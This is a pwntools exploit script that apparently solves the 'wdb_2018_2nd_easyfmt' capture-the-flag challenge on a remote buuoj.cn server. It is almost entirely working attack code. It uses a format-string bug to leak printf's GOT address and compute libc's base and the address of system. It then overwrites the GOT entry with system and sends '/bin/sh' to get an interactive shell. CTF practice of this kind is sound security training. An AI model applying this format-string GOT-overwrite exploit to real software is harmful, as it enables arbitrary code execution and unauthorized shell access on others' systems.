#!/usr/bin/env python3
# Date: 2024-11-11 11:55:33

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.binary = './wdb_2018_2nd_easyfmt'
context.log_level = 'debug'
context.timeout = 5

# io = process('./wdb_2018_2nd_easyfmt')
io = remote('node5.buuoj.cn', 28401)
elf = ELF('./wdb_2018_2nd_easyfmt')
libc = ELF('/lib32/libc.so.6')


def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv


# def leak(payload):
#     s(payload + b'aaaa')
#     ru(b'aaaa')

ru(b'Do you know repeater?')
# for i in range(15):
#     payload = '%' + str(i) + '$p'
#     leak(payload.encode())

printf_got = elf.got['printf']

payload = b'aaaa' + b'%8$s' + p32(printf_got) + b'bbbb'
s(payload)
ru(b'aaaa')
printf_addr = u32(r(4))
libc_base = printf_addr - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
sleep(1)
leak('printf_addr', printf_addr)
leak('libc_base', libc_base)
leak('system_addr', system_addr)

payload = fmtstr_payload(6, {printf_got: system_addr})
sa(b'bbbb', payload)
s(b'/bin/sh\x00')
ia()
